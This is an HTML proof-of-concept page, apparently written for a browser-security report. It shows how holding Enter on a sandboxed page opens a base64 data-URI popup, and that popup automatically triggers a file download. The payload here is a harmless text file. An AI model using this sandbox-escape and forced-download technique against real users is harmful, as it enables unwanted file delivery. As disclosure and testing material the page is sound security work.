<!DOCTYPE html>
<html lang="id">

<head>
    <meta charset="UTF-8">
    <title>PoC - Clean Data-URI Escape</title>
    <style>
        body {
            background-color: #ffebee;
            font-family: sans-serif;
            text-align: center;
            padding-top: 50px;
        }

        #targetBtn {
            padding: 15px;
            cursor: pointer;
            background: #d32f2f;
            color: white;
            border: none;
            border-radius: 5px;
        }
    </style>
</head>

<body>

    <h3>Situs A (Sandboxed)</h3>
    <button id="targetBtn">1. KLIK DULU</button>
    <p>2. Lalu tahan <strong>ENTER</strong></p>

    <script>
        const rawPayload = `
            <html>
            <body>
                <h2 style="color:red">Konteks Data URI</h2>
                <script>
                    try {
                        const a = document.createElement("a");
                        a.href = "data:application/octet-stream;base64,U2FuZGJveCBCeXBhc3MgU3VjY2Vzcw==";
                        a.download = "data_uri_bypass.txt";
                        document.body.appendChild(a);
                        a.click();
                        console.log("Download dipicu!");
                    } catch (e) { console.error(e.message); }
                <\/script>
            </body>
            </html>
        `;

        const encodedPayload = btoa(rawPayload);

        window.addEventListener("keydown", (e) => {
            if (e.key === "Enter") {
                console.log("Membuka popup via Data-URI...");
                window.open(
                    "data:text/html;base64," + encodedPayload,
                    "_blank",
                    "width=400,height=300"
                );
            }
        });

        document.getElementById('targetBtn').focus();
    </script>
</body>

</html>
